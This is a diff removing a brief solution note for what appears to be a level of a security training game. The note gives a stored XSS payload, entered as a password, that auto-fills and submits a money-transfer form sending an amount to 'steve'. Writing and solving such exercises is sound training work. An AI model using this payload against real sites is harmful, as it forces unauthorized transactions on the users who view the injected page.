@@ -1,9 +1,0 @@
-This level is a XSS attack. Create a user with this password:
-
-```
-<script>
-document.querySelector("input[name=to]").value="steve";
-document.querySelector("input[name=amount]").value="1";
-document.querySelector("input[type=submit]").click();
-</script>
-```
